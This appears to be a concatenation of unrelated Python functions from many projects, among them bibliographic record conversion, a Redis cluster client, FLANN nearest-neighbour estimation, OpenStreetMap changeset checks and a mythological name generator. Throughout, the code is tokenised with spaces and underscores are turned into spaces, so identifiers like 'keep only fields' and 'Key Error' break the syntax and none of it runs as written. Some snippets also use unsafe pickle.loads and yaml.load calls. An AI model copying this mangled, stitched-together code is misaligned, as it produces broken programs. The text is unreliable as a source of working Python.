def match ( self , query = None , * * kwargs ) : from invenio . search engine import perform request search if not query : # We use default setup recid = self . record [ "001" ] [ 0 ] [ 3 ] return perform request search ( p = "035:%s" % ( recid , ) , of = "id" ) else : if "recid" not in kwargs : kwargs [ "recid" ] = self . record [ "001" ] [ 0 ] [ 3 ] return perform request search ( p = query % kwargs , of = "id" )
def keep only fields ( self ) : for tag in self . record . keys ( ) : if tag not in self . fields list : record delete fields ( self . record , tag )
def strip fields ( self ) : for tag in self . record . keys ( ) : if tag in self . fields list : record delete fields ( self . record , tag )
def add systemnumber ( self , source , recid = None ) : if not recid : recid = self . get recid ( ) if not self . hidden and recid : record add field ( self . record , tag = '035' , subfields = [ ( '9' , source ) , ( 'a' , recid ) ] )
def add control number ( self , tag , value ) : record add field ( self . record , tag , controlfield value = value )
def update subject categories ( self , primary , secondary , kb ) : category fields = record get field instances ( self . record , tag = '650' , ind1 = '1' , ind2 = '7' ) record delete fields ( self . record , "650" ) for field in category fields : for idx , ( key , value ) in enumerate ( field [ 0 ] ) : if key == 'a' : new value = self . get config item ( value , kb ) if new value != value : new subs = [ ( '2' , secondary ) , ( 'a' , new value ) ] else : new subs = [ ( '2' , primary ) , ( 'a' , value ) ] record add field ( self . record , "650" , ind1 = "1" , ind2 = "7" , subfields = new subs ) break
def get reference ( self , ref ) : label = get value in tag ( ref , 'label' ) label = re . sub ( '\D' , '' , label ) for innerref in ref . get Elements By Tag Name ( 'mixed-citation' ) : ref type = innerref . get Attribute ( 'publication-type' ) institution = get value in tag ( innerref , 'institution' ) report no = '' for tag in innerref . get Elements By Tag Name ( 'pub-id' ) : if tag . get Attribute ( 'pub-id-type' ) == 'other' : if tag . has Child Nodes ( ) : report no = get all text ( tag ) doi = '' for tag in innerref . get Elements By Tag Name ( 'pub-id' ) : if tag . get Attribute ( 'pub-id-type' ) == 'doi' : doi = xml to text ( tag ) collaboration = get value in tag ( innerref , 'collab' ) authors = [ ] person groups = innerref . get Elements By Tag Name ( 'person-group' ) for author group in person groups : if author group . get Attribute ( 'person-group-type' ) == 'author' : for author in author group . get Elements By Tag Name ( 'string-name' ) : if author . has Child Nodes ( ) : authors . append ( get all text ( author ) ) editors = [ ] for editor group in person groups : if editor group . get Attribute ( 'person-group-type' ) == 'editor' : for editor in editor group . get Elements By Tag Name ( 'string-name' ) : if editor . has Child Nodes ( ) : editors . append ( get all text ( editor ) ) journal = get value in tag ( innerref , 'source' ) journal , volume = fix journal name ( journal , self . journal mappings ) volume += get value in tag ( innerref , 'volume' ) if journal == 'J.High Energy Phys.' or journal == 'JHEP' : issue = get value in tag ( innerref , 'issue' ) volume = volume [ 2 : ] + issue journal = 'JHEP' page = get value in tag ( innerref , 'page-range' ) year = get value in tag ( innerref , 'year' ) external link = get value in tag ( innerref , 'ext-link' ) arxiv = '' for tag in innerref . get Elements By Tag Name ( 'pub-id' ) : if tag . get Attribute ( 'pub-id-type' ) == 'arxiv' : if tag . has Child Nodes ( ) : arxiv = get all text ( tag ) arxiv = format arxiv id ( arxiv ) publisher = get value in tag ( innerref , 'publisher-name' ) publisher location = get value in tag ( innerref , 'publisher-loc' ) if publisher location : publisher = publisher location + ': ' + publisher unstructured text = [ ] for child in innerref . child Nodes : if child . node Type == child . TEXT NODE : text = child . node Value . strip ( ) text = re . sub ( r'[\[\]\(\.;\)]' , '' , text ) . strip ( ) if text . startswith ( ',' ) : text = text [ 1 : ] . strip ( ) if text . endswith ( 'Report No' ) : text = institution + " " + text institution = '' text = text . strip ( ) elif text . endswith ( ' ed' ) : text += '.' elif text . endswith ( 'Ph D thesis,' ) : if institution : text += ' ' + institution institution = '' else : text = text [ : - 1 ] elif text . startswith ( 'Seminar,' ) : article title = get value in tag ( innerref , 'article-title' ) text = institution + " Seminar, \"" + article title + "\"" institution = '' elif text == u'\u201d' : text = '' ignore text = [ 'in' , 'pp' , 'edited by' ] if text . startswith ( 'Vol' ) : temp = re . sub ( r'\D' , '' , text ) if temp : volume += temp elif len ( text ) > 1 and text not in ignore text and not ( text . isdigit ( ) or text [ : - 1 ] . isdigit ( ) ) : unstructured text . append ( text ) if unstructured text : unstructured text = " " . join ( unstructured text ) if ref type == 'book' : if volume and not volume . lower ( ) . startswith ( 'vol' ) : volume = 'Vol ' + volume if volume and page : volume = volume + ', pp ' + page yield ref type , doi , authors , collaboration , journal , volume , page , year , label , arxiv , publisher , institution , unstructured text , external link , report no , editors
def add references ( self , rec ) : for ref in self . document . get Elements By Tag Name ( 'ref' ) : for ref type , doi , authors , collaboration , journal , volume , page , year , label , arxiv , publisher , institution , unstructured text , external link , report no , editors in self . get reference ( ref ) : subfields = [ ] if doi : subfields . append ( ( 'a' , doi ) ) for author in authors : subfields . append ( ( 'h' , author ) ) for editor in editors : subfields . append ( ( 'e' , editor ) ) if year : subfields . append ( ( 'y' , year ) ) if unstructured text : if page : subfields . append ( ( 'm' , unstructured text + ', ' + page ) ) else : subfields . append ( ( 'm' , unstructured text ) ) if collaboration : subfields . append ( ( 'c' , collaboration ) ) if institution : subfields . append ( ( 'm' , institution ) ) if publisher : subfields . append ( ( 'p' , publisher ) ) if arxiv : subfields . append ( ( 'r' , arxiv ) ) if report no : subfields . append ( ( 'r' , report no ) ) if external link : subfields . append ( ( 'u' , external link ) ) if label : subfields . append ( ( 'o' , label ) ) if ref type == 'book' : if journal : subfields . append ( ( 't' , journal ) ) if volume : subfields . append ( ( 'm' , volume ) ) elif page and not unstructured text : subfields . append ( ( 'm' , page ) ) else : if volume and page : subfields . append ( ( 's' , journal + "," + volume + "," + page ) ) elif journal : subfields . append ( ( 't' , journal ) ) if ref type : subfields . append ( ( 'd' , ref type ) ) if not subfields : #misc-type references try : r = ref . get Elements By Tag Name ( 'mixed-citation' ) [ 0 ] text = xml to text ( r ) label = text . split ( ) [ 0 ] text = " " . join ( text . split ( ) [ 1 : ] ) subfields . append ( ( 's' , text ) ) record add field ( rec , '999' , ind1 = 'C' , ind2 = '5' , subfields = subfields ) except Index Error : #references without 'mixed-citation' tag try : r = ref . get Elements By Tag Name ( 'note' ) [ 0 ] subfields . append ( ( 's' , xml to text ( r ) ) ) record add field ( rec , '999' , ind1 = 'C' , ind2 = '5' , subfields = subfields ) except Index Error : #references without 'note' tag subfields . append ( ( 's' , xml to text ( ref ) ) ) record add field ( rec , '999' , ind1 = 'C' , ind2 = '5' , subfields = subfields ) else : record add field ( rec , '999' , ind1 = 'C' , ind2 = '5' , subfields = subfields )
def connect ( self ) : self . ftp . connect ( ) self . ftp . login ( user = self . username , passwd = self . passwd )
def parse data ( self , text , maxwidth , maxheight , template dir , context , urlize all links ) : # create a dictionary of user urls -> rendered responses replacements = { } user urls = set ( re . findall ( URL RE , text ) ) for user url in user urls : try : resource = oembed . site . embed ( user url , maxwidth = maxwidth , maxheight = maxheight ) except O Embed Exception : if urlize all links : replacements [ user url ] = '<a href="%(LINK)s">%(LINK)s</a>' % { 'LINK' : user url } else : context [ 'minwidth' ] = min ( maxwidth , resource . width ) context [ 'minheight' ] = min ( maxheight , resource . height ) replacement = self . render oembed ( resource , user url , template dir = template dir , context = context ) replacements [ user url ] = replacement . strip ( ) # go through the text recording UR Ls that can be replaced # taking note of their start & end indexes user urls = re . finditer ( URL RE , text ) matches = [ ] for match in user urls : if match . group ( ) in replacements : matches . append ( [ match . start ( ) , match . end ( ) , match . group ( ) ] ) # replace the UR Ls in order, offsetting the indices each go for indx , ( start , end , user url ) in enumerate ( matches ) : replacement = replacements [ user url ] difference = len ( replacement ) - len ( user url ) # insert the replacement between two slices of text surrounding the # original url text = text [ : start ] + replacement + text [ end : ] # iterate through the rest of the matches offsetting their indices # based on the difference between replacement/original for j in xrange ( indx + 1 , len ( matches ) ) : matches [ j ] [ 0 ] += difference matches [ j ] [ 1 ] += difference return mark safe ( text )
def get rev ( self , key , version , * * kwa ) : if ' doc' in kwa : doc = kwa [ ' doc' ] else : if type ( version ) is int : if version == 0 : order = pymongo . ASCENDING elif version == - 1 : order = pymongo . DESCENDING doc = self . collection . find one ( { 'k' : key } , sort = [ [ 'd' , order ] ] ) elif type ( version ) is datetime : ver = self . round time ( version ) doc = self . collection . find one ( { 'k' : key , 'd' : ver } ) if doc is None : raise Key Error ( 'Supplied key `{0}` or version `{1}` does not exist' . format ( key , str ( version ) ) ) coded val = doc [ 'v' ] return pickle . loads ( coded val )
def hashkey ( self , method , url , * * kwa ) : to hash = '' . join ( [ str ( method ) , str ( url ) , str ( kwa . get ( 'data' , '' ) ) , str ( kwa . get ( 'params' , '' ) ) ] ) return hashlib . md5 ( to hash . encode ( ) ) . hexdigest ( )
def available drivers ( ) : global modules global available if type ( modules ) is not list : modules = list ( modules ) if not available : available = [ d . ahio Driver Info . NAME for d in modules if d . ahio Driver Info . AVAILABLE ] return available
def guess array memory usage ( bam readers , dtype , use strand = False ) : ARRAY COUNT = 5 if not isinstance ( bam readers , list ) : bam readers = [ bam readers ] if isinstance ( dtype , basestring ) : dtype = NUMPY DTYPES . get ( dtype , None ) use strand = use strand + 1 #if false, factor of 1, if true, factor of 2 dtypes = guess numpy dtypes from idxstats ( bam readers , default = None , force dtype = False ) if not [ dt for dt in dtypes if dt is not None ] : #found no info from idx dtypes = guess numpy dtypes from idxstats ( bam readers , default = dtype or numpy . uint64 , force dtype = True ) elif dtype : dtypes = [ dtype if dt else None for dt in dtypes ] read groups = [ ] no read group = False for bam in bam readers : rgs = bam . get read groups ( ) if rgs : for rg in rgs : if rg not in read groups : read groups . append ( rg ) else : no read group = True read groups = len ( read groups ) + no read group max ref size = 0 array byte overhead = sys . getsizeof ( numpy . zeros ( ( 0 ) , dtype = numpy . uint64 ) ) array count = ARRAY COUNT * use strand * read groups for bam in bam readers : for i , ( name , length ) in enumerate ( bam . get references ( ) ) : if dtypes [ i ] is not None : max ref size = max ( max ref size , ( length + length * dtypes [ i ] ( ) . nbytes * array count + ( array byte overhead * ( array count + 1 ) ) ) ) return max ref size
def main ( ) : usage = "Usage: %prog PATH TO PACKAGE" parser = optparse . Option Parser ( usage = usage ) parser . add option ( "-v" , "--verbose" , action = "store true" , dest = "verbose" , default = False , help = "Show debug output" ) parser . add option ( "-d" , "--output-dir" , action = "store" , type = "string" , dest = "output dir" , default = '' , help = "" ) parser . add option ( "-t" , "--test-args" , action = "store" , type = "string" , dest = "test args" , default = '' , help = ( "Pass argument on to bin/test. Quote the argument, " + "for instance \"-t '-m somemodule'\"." ) ) ( options , args ) = parser . parse args ( ) if options . verbose : log level = logging . DEBUG else : log level = logging . INFO logging . basic Config ( level = log level , format = "%(levelname)s: %(message)s" ) curdir = os . getcwd ( ) testbinary = os . path . join ( curdir , 'bin' , 'test' ) if not os . path . exists ( testbinary ) : raise Runtime Error ( "Test command doesn't exist: %s" % testbinary ) coveragebinary = os . path . join ( curdir , 'bin' , 'coverage' ) if not os . path . exists ( coveragebinary ) : logger . debug ( "Trying globally installed coverage command." ) coveragebinary = 'coverage' logger . info ( "Running tests in coverage mode (can take a long time)" ) parts = [ coveragebinary , 'run' , testbinary ] if options . test args : parts . append ( options . test args ) system ( " " . join ( parts ) ) logger . debug ( "Creating coverage reports..." ) if options . output dir : coverage dir = options . output dir open in browser = False else : coverage dir = 'htmlcov' # The default open in browser = True system ( "%s html --directory=%s" % ( coveragebinary , coverage dir ) ) logger . info ( "Wrote coverage files to %s" , coverage dir ) if open in browser : index file = os . path . abspath ( os . path . join ( coverage dir , 'index.html' ) ) logger . debug ( "About to open %s in your webbrowser." , index file ) webbrowser . open ( 'file://' + index file ) logger . info ( "Opened reports in your browser." )
def output entire buffer ( self ) : green = 0 red = 0 for row in range ( 0 , 8 ) : for col in range ( 0 , 8 ) : if self . display buffer [ row ] [ col ] == self . LED GREEN : green |= 1 << col elif self . display buffer [ row ] [ col ] == self . LED RED : red |= 1 << col elif self . display buffer [ row ] [ col ] == self . LED YELLOW : green |= 1 << col red |= 1 << col elif self . display buffer [ row ] [ col ] == self . LED OFF : green &= ~ ( 1 << col ) red &= ~ ( 1 << col ) self . firmata . i2c write ( 0x70 , row * 2 , 0 , green ) self . firmata . i2c write ( 0x70 , row * 2 + 1 , 0 , red )
def clear display buffer ( self ) : for row in range ( 0 , 8 ) : self . firmata . i2c write ( 0x70 , row * 2 , 0 , 0 ) self . firmata . i2c write ( 0x70 , ( row * 2 ) + 1 , 0 , 0 ) for column in range ( 0 , 8 ) : self . display buffer [ row ] [ column ] = 0
def retrieve url ( self , url ) : try : r = requests . get ( url ) except requests . Connection Error : raise exceptions . Retrieve Error ( 'Connection fail' ) if r . status code >= 400 : raise exceptions . Retrieve Error ( 'Connected, but status code is %s' % ( r . status code ) ) real url = r . url content = r . content try : content type = r . headers [ 'Content-Type' ] except Key Error : content type , encoding = mimetypes . guess type ( real url , strict = False ) self . response = r return content type . lower ( ) , content
def getnodenamefor ( self , name ) : return 'node ' + str ( ( abs ( binascii . crc32 ( b ( name ) ) & 0xffffffff ) % self . no servers ) + 1 )
def getnodefor ( self , name ) : node = self . getnodenamefor ( name ) return { node : self . cluster [ 'nodes' ] [ node ] }
def object ( self , infotype , key ) : redisent = self . redises [ self . getnodenamefor ( key ) + ' slave' ] return getattr ( redisent , 'object' ) ( infotype , key )
def rc mset ( self , mapping ) : result = True for k , v in iteritems ( mapping ) : result = result and self . set ( k , v ) return result
def rc mget ( self , keys , * args ) : args = list or args ( keys , args ) result = [ ] for key in args : result . append ( self . get ( key ) ) return result
def rc rename ( self , src , dst ) : if src == dst : return self . rename ( src + "{" + src + "}" , src ) if not self . exists ( src ) : return self . rename ( src + "{" + src + "}" , src ) self . delete ( dst ) ktype = self . type ( src ) kttl = self . ttl ( src ) if ktype == b ( 'none' ) : return False if ktype == b ( 'string' ) : self . set ( dst , self . get ( src ) ) elif ktype == b ( 'hash' ) : self . hmset ( dst , self . hgetall ( src ) ) elif ktype == b ( 'list' ) : for k in self . lrange ( src , 0 , - 1 ) : self . rpush ( dst , k ) elif ktype == b ( 'set' ) : for k in self . smembers ( src ) : self . sadd ( dst , k ) elif ktype == b ( 'zset' ) : for k , v in self . zrange ( src , 0 , - 1 , withscores = True ) : self . zadd ( dst , v , k ) # Handle keys with an expire time set kttl = - 1 if kttl is None or kttl < 0 else int ( kttl ) if kttl != - 1 : self . expire ( dst , kttl ) return self . delete ( src )
def rc renamenx ( self , src , dst ) : if self . exists ( dst ) : return False return self . rc rename ( src , dst )
def rc keys ( self , pattern = '*' ) : result = [ ] for alias , redisent in iteritems ( self . redises ) : if alias . find ( ' slave' ) == - 1 : continue result . extend ( redisent . keys ( pattern ) ) return result
def rc dbsize ( self ) : result = 0 for alias , redisent in iteritems ( self . redises ) : if alias . find ( ' slave' ) == - 1 : continue result += redisent . dbsize ( ) return result
def prepare ( self ) : # Create a collection for the attributes and elements of # this instance. attributes , elements = Ordered Dict ( ) , [ ] # Initialize the namespace map. nsmap = dict ( [ self . meta . namespace ] ) # Iterate through all declared items. for name , item in self . items . items ( ) : if isinstance ( item , Attribute ) : # Prepare the item as an attribute. attributes [ name ] = item . prepare ( self ) elif isinstance ( item , Element ) : # Update the nsmap. nsmap . update ( [ item . namespace ] ) # Prepare the item as an element. elements . append ( item ) # Return the collected attributes and elements return attributes , elements , nsmap
def get queryset ( self , request ) : qs = super ( Gallery Admin , self ) . get queryset ( request ) return qs . annotate ( photo count = Count ( 'photos' ) )
def save model ( self , request , obj , form , change ) : obj . author = request . user obj . save ( )
def save formset ( self , request , form , formset , change ) : instances = formset . save ( commit = False ) for instance in instances : if isinstance ( instance , Photo ) : instance . author = request . user instance . save ( )
def convert ranges ( cls , ranges , length ) : result = [ ] for start , end in ranges : if end is None : result . append ( ( start , length - 1 ) ) elif start is None : s = length - end result . append ( ( 0 if s < 0 else s , length - 1 ) ) else : result . append ( ( start , end if end < length else length - 1 ) ) return result
def condense ranges ( cls , ranges ) : result = [ ] if ranges : ranges . sort ( key = lambda tup : tup [ 0 ] ) result . append ( ranges [ 0 ] ) for i in range ( 1 , len ( ranges ) ) : if result [ - 1 ] [ 1 ] + 1 >= ranges [ i ] [ 0 ] : result [ - 1 ] = ( result [ - 1 ] [ 0 ] , max ( result [ - 1 ] [ 1 ] , ranges [ i ] [ 1 ] ) ) else : result . append ( ranges [ i ] ) return result
def print read ( self , rid ) : if self . rname is not None : print self . rname [ rid ] print '--' r = self . get read data ( rid ) aligned loci = np . unique ( r . nonzero ( ) [ 1 ] ) for locus in aligned loci : nzvec = r [ : , locus ] . todense ( ) . transpose ( ) [ 0 ] . A . flatten ( ) if self . lname is not None : print self . lname [ locus ] , else : print locus , print nzvec
def setup ( ) : s = str . split if sys . version info < ( 3 , 0 ) : s = unicode . split def pop all ( some dict , some list ) : for scheme in some list : some dict . pop ( scheme ) global SCHEMES SCHEMES = copy . deepcopy ( sanscript . SCHEMES ) pop all ( SCHEMES , [ sanscript . ORIYA , sanscript . BENGALI , sanscript . GUJARATI ] ) SCHEMES [ HK ] . update ( { 'vowels' : s ( """a A i I u U R RR l R l RR E ai O au""" ) + s ( """e o""" ) , 'marks' : s ( """A i I u U R RR l R l RR E ai O au""" ) + s ( """e o""" ) , 'consonants' : sanscript . SCHEMES [ HK ] [ 'consonants' ] + s ( """n2 r2 zh""" ) } ) SCHEMES [ ITRANS ] . update ( { 'vowels' : s ( """a A i I u U R RR L Li LLI E ai O au""" ) + s ( """e o""" ) , 'marks' : s ( """A i I u U R RR L Li LLI E ai O au""" ) + s ( """e o""" ) , 'consonants' : sanscript . SCHEMES [ ITRANS ] [ 'consonants' ] + s ( """n2 r2 zh""" ) } ) pop all ( SCHEMES [ ITRANS ] . synonym map , s ( """e o""" ) ) SCHEMES [ OPTITRANS ] . update ( { 'vowels' : s ( """a A i I u U R RR L Li LLI E ai O au""" ) + s ( """e o""" ) , 'marks' : s ( """A i I u U R RR L Li LLI E ai O au""" ) + s ( """e o""" ) , 'consonants' : sanscript . SCHEMES [ OPTITRANS ] [ 'consonants' ] + s ( """n2 r2 zh""" ) } ) pop all ( SCHEMES [ OPTITRANS ] . synonym map , s ( """e o""" ) )
def to utf8 ( y ) : out = [ ] for x in y : if x < 0x080 : out . append ( x ) elif x < 0x0800 : out . append ( ( x >> 6 ) | 0x C0 ) out . append ( ( x & 0x3F ) | 0x80 ) elif x < 0x10000 : out . append ( ( x >> 12 ) | 0x E0 ) out . append ( ( ( x >> 6 ) & 0x3F ) | 0x80 ) out . append ( ( x & 0x3F ) | 0x80 ) else : out . append ( ( x >> 18 ) | 0x F0 ) out . append ( ( x >> 12 ) & 0x3F ) out . append ( ( ( x >> 6 ) & 0x3F ) | 0x80 ) out . append ( ( x & 0x3F ) | 0x80 ) return '' . join ( map ( chr , out ) )
def set script ( self , i ) : if i in range ( 1 , 10 ) : n = i - 1 else : raise Illegal Input ( "Invalid Value for ATR %s" % ( hex ( i ) ) ) if n > - 1 : # n = -1 is the default script .. self . curr script = n self . delta = n * DELTA return
def unrecognised ( chr ) : if options [ 'handle Unrecognised' ] == UNRECOGNISED ECHO : return chr elif options [ 'handle Unrecognised' ] == UNRECOGNISED SUBSTITUTE : return options [ 'substitute Char' ] else : raise ( Key Error , chr )
def clear sent messages ( self , offset = None ) : if offset is None : offset = getattr ( settings , 'MAILQUEUE CLEAR OFFSET' , defaults . MAILQUEUE CLEAR OFFSET ) if type ( offset ) is int : offset = datetime . timedelta ( hours = offset ) delete before = timezone . now ( ) - offset self . filter ( sent = True , last attempt lte = delete before ) . delete ( )
def get orthographies ( self , library = library ) : results = [ ] for charset in library . charsets : if self . charsets : cn = getattr ( charset , 'common name' , False ) abbr = getattr ( charset , 'abbreviation' , False ) nn = getattr ( charset , 'short name' , False ) naive = getattr ( charset , 'native name' , False ) if cn and cn . lower ( ) in self . charsets : results . append ( charset ) elif nn and nn . lower ( ) in self . charsets : results . append ( charset ) elif naive and naive . lower ( ) in self . charsets : results . append ( charset ) elif abbr and abbr . lower ( ) in self . charsets : results . append ( charset ) else : results . append ( charset ) for result in results : yield Charset Info ( self , result )
def generate oauth2 headers ( self ) : encoded credentials = base64 . b64encode ( ( '{0}:{1}' . format ( self . consumer key , self . consumer secret ) ) . encode ( 'utf-8' ) ) headers = { 'Authorization' : 'Basic {0}' . format ( encoded credentials . decode ( 'utf-8' ) ) , 'Content-Type' : 'application/x-www-form-urlencoded' } return headers
def get data ( filename ) : name , ext = get file extension ( filename ) func = json get data if ext == '.json' else yaml get data return func ( filename )
def write data ( data , filename ) : name , ext = get file extension ( filename ) func = json write data if ext == '.json' else yaml write data return func ( data , filename )
def json write data ( json data , filename ) : with open ( filename , 'w' ) as fp : json . dump ( json data , fp , indent = 4 , sort keys = True , ensure ascii = False ) return True return False
def json get data ( filename ) : with open ( filename ) as fp : json data = json . load ( fp ) return json data return False
def yaml get data ( filename ) : with open ( filename , 'rb' ) as fd : yaml data = yaml . load ( fd ) return yaml data return False
def yaml write data ( yaml data , filename ) : with open ( filename , 'w' ) as fd : yaml . dump ( yaml data , fd , default flow style = False ) return True return False
def get live version ( self ) : try : import versiontools except Import Error : return None else : return str ( versiontools . Version . from expression ( self . name ) )
def is categorical type ( ary ) : ary = np . asanyarray ( ary ) return is integer type ( ary ) or ary . dtype . kind == 'b'
def build indices ( X , flann args ) : # TODO: should probably multithread this logger . info ( "Building indices..." ) indices = [ None ] * len ( X ) for i , bag in enumerate ( plog ( X , name = "index building" ) ) : indices [ i ] = idx = FLANN Index ( * * flann args ) idx . build index ( bag ) return indices
def get rhos ( X , indices , Ks , max K , save all Ks , min dist ) : logger . info ( "Getting within-bag distances..." ) if max K >= X . n pts . min ( ) : msg = "asked for K = {}, but there's a bag with only {} points" raise Value Error ( msg . format ( max K , X . n pts . min ( ) ) ) # need to throw away the closest neighbor, which will always be self # thus K=1 corresponds to column 1 in the result array which Ks = slice ( 1 , None ) if save all Ks else Ks indices = plog ( indices , name = "within-bag distances" ) rhos = [ None ] * len ( X ) for i , ( idx , bag ) in enumerate ( zip ( indices , X ) ) : r = np . sqrt ( idx . nn index ( bag , max K + 1 ) [ 1 ] [ : , which Ks ] ) np . maximum ( min dist , r , out = r ) rhos [ i ] = r return rhos
def get Ks ( self ) : Ks = as integer type ( self . Ks ) if Ks . ndim != 1 : raise Type Error ( "Ks should be 1-dim, got shape {}" . format ( Ks . shape ) ) if Ks . min ( ) < 1 : raise Value Error ( "Ks should be positive; got {}" . format ( Ks . min ( ) ) ) return Ks
def flann args ( self , X = None ) : args = { 'cores' : self . n jobs } if self . flann algorithm == 'auto' : if X is None or X . dim > 5 : args [ 'algorithm' ] = 'linear' else : args [ 'algorithm' ] = 'kdtree single' else : args [ 'algorithm' ] = self . flann algorithm if self . flann args : args . update ( self . flann args ) # check that arguments are correct try : FLANN Parameters ( ) . update ( args ) except Attribute Error as e : msg = "flann args contains an invalid argument:\n  {}" raise Type Error ( msg . format ( e ) ) return args
def make stacked ( self ) : if self . stacked : return self . boundaries = bounds = np . r [ 0 , np . cumsum ( self . n pts ) ] self . stacked features = stacked = np . vstack ( self . features ) self . features = np . array ( [ stacked [ bounds [ i - 1 ] : bounds [ i ] ] for i in xrange ( 1 , len ( bounds ) ) ] , dtype = object ) self . stacked = True
def bare ( self ) : if not self . meta : return self elif self . stacked : return Features ( self . stacked features , self . n pts , copy = False ) else : return Features ( self . features , copy = False )
def run ( self ) : logger . info ( u'Started listening' ) while not self . stop : xml = self . readxml ( ) # Exit on invalid XML if xml is None : break # Raw xml only if not self . modelize : logger . info ( u'Raw xml: %s' % xml ) self . results . put ( xml ) continue # Model objects + raw xml as fallback if xml . tag == 'RECOGOUT' : sentence = Sentence . from shypo ( xml . find ( 'SHYPO' ) , self . encoding ) logger . info ( u'Modelized recognition: %r' % sentence ) self . results . put ( sentence ) else : logger . info ( u'Unmodelized xml: %s' % xml ) self . results . put ( xml ) logger . info ( u'Stopped listening' )
def disconnect ( self ) : logger . info ( u'Disconnecting' ) self . sock . shutdown ( socket . SHUT RDWR ) self . sock . close ( ) self . state = DISCONNECTED
def cli ( id ) : ch = Analyse ( id ) ch . full analysis ( ) click . echo ( 'Created: %s. Modified: %s. Deleted: %s' % ( ch . create , ch . modify , ch . delete ) ) if ch . is suspect : click . echo ( 'The changeset {} is suspect! Reasons: {}' . format ( id , ', ' . join ( ch . suspicion reasons ) ) ) else : click . echo ( 'The changeset %s is not suspect!' % id )
def filter ( self ) : self . content = [ ch for ch in self . xml . getchildren ( ) if get bounds ( ch ) . intersects ( self . area ) ]
def label suspicious ( self , reason ) : self . suspicion reasons . append ( reason ) self . is suspect = True
def full analysis ( self ) : self . count ( ) self . verify words ( ) self . verify user ( ) if self . review requested == 'yes' : self . label suspicious ( 'Review requested' )
def verify editor ( self ) : powerful editors = [ 'josm' , 'level0' , 'merkaartor' , 'qgis' , 'arcgis' , 'upload.py' , 'osmapi' , 'Services Open Street Map' ] if self . editor is not None : for editor in powerful editors : if editor in self . editor . lower ( ) : self . powerfull editor = True break if 'i D' in self . editor : trusted hosts = [ 'www.openstreetmap.org/id' , 'www.openstreetmap.org/edit' , 'improveosm.org' , 'strava.github.io/i D' , 'preview.ideditor.com/release' , 'preview.ideditor.com/master' , 'hey.mapbox.com/i D-internal' , 'projets.pavie.info/id-indoor' , 'maps.mapcat.com/edit' , 'id.softek.ir' ] if self . host . split ( '://' ) [ - 1 ] . strip ( '/' ) not in trusted hosts : self . label suspicious ( 'Unknown i D instance' ) else : self . powerfull editor = True self . label suspicious ( 'Software editor was not declared' )
def spawn ( self , generations ) : egg donors = [ god for god in self . gods . values ( ) if god . chromosomes == 'XX' ] sperm donors = [ god for god in self . gods . values ( ) if god . chromosomes == 'XY' ] for i in range ( generations ) : print ( "\n GENERATION %d\n" % ( i + 1 ) ) gen xx = [ ] gen xy = [ ] for egg donor in egg donors : sperm donor = random . choice ( sperm donors ) brood = self . breed ( egg donor , sperm donor ) for child in brood : if child . divinity > human : # divine offspring join the Pantheon self . add god ( child ) if child . chromosomes == 'XX' : gen xx . append ( child ) else : gen xy . append ( child ) # elder gods leave the breeding pool egg donors = [ ed for ed in egg donors if ed . generation > ( i - 2 ) ] sperm donors = [ sd for sd in sperm donors if sd . generation > ( i - 3 ) ] # mature offspring join the breeding pool egg donors += gen xx sperm donors += gen xy
def breed ( self , egg donor , sperm donor ) : offspring = [ ] try : num children = npchoice ( [ 1 , 2 ] , 1 , p = [ 0.8 , 0.2 ] ) [ 0 ] # 20% chance of twins for in range ( num children ) : child = God ( egg donor , sperm donor ) offspring . append ( child ) send birth announcement ( egg donor , sperm donor , child ) except Value Error : print ( "Breeding error occurred. Likely the generator ran out of names." ) return offspring
def cosine ( vec1 , vec2 ) : if norm ( vec1 ) > 0 and norm ( vec2 ) > 0 : return dot ( vec1 , vec2 ) / ( norm ( vec1 ) * norm ( vec2 ) ) else : return 0.0
def set name lists ( ethnicity = None ) : if not ethnicity : ethnicity = random . choice ( get ethnicities ( ) ) print ( "Loading names from: " + ethnicity ) filename = names dir + ethnicity + '.json' try : with open ( filename , 'r' ) as injson : data = json . load ( injson ) except : return 'Unable to read from file: ' + filename else : names = [ tuple ( name . split ( ',' ) ) for name in data ] random . shuffle ( names ) global female names female names = [ name for name , gender , * desc in names if gender == 'girl' ] global male names male names = [ name for name , gender , * desc in names if gender == 'boy' ] global nb names nb names = [ name for name , gender , * desc in names if gender == 'boygirl' ]
def set inherited traits ( self , egg donor , sperm donor ) : if type ( egg donor ) == str : self . reproduce asexually ( egg donor , sperm donor ) else : self . reproduce sexually ( egg donor , sperm donor )
def print parents ( self ) : if self . gender == female : title = 'Daughter' elif self . gender == male : title = 'Son' else : title = 'Child' p1 = self . parents [ 0 ] p2 = self . parents [ 1 ] template = '%s of %s, the %s, and %s, the %s.' print ( template % ( title , p1 . name , p1 . epithet , p2 . name , p2 . epithet ) )
def format seconds ( self , n seconds ) : func = self . ok if n seconds >= 60 : n minutes , n seconds = divmod ( n seconds , 60 ) return "%s minutes %s seconds" % ( func ( "%d" % n minutes ) , func ( "%.3f" % n seconds ) ) else : return "%s seconds" % ( func ( "%.3f" % n seconds ) )
def ppdict ( dict to print , br = '\n' , html = False , key align = 'l' , sort keys = True , key preffix = '' , key suffix = '' , value prefix = '' , value suffix = '' , left margin = 3 , indent = 2 ) : if dict to print : if sort keys : dic = dict to print . copy ( ) keys = list ( dic . keys ( ) ) keys . sort ( ) dict to print = Ordered Dict ( ) for k in keys : dict to print [ k ] = dic [ k ] tmp = [ '{' ] ks = [ type ( x ) == str and "'%s'" % x or x for x in dict to print . keys ( ) ] vs = [ type ( x ) == str and "'%s'" % x or x for x in dict to print . values ( ) ] max key len = max ( [ len ( str ( x ) ) for x in ks ] ) for i in range ( len ( ks ) ) : k = { 1 : str ( ks [ i ] ) . ljust ( max key len ) , key align == 'r' : str ( ks [ i ] ) . rjust ( max key len ) } [ 1 ] v = vs [ i ] tmp . append ( ' ' * indent + '{}{}{}:{}{}{},' . format ( key preffix , k , key suffix , value prefix , v , value suffix ) ) tmp [ - 1 ] = tmp [ - 1 ] [ : - 1 ] # remove the ',' in the last item tmp . append ( '}' ) if left margin : tmp = [ ' ' * left margin + x for x in tmp ] if html : return '<code>{}</code>' . format ( br . join ( tmp ) . replace ( ' ' , '&nbsp;' ) ) else : return br . join ( tmp ) else : return '{}'
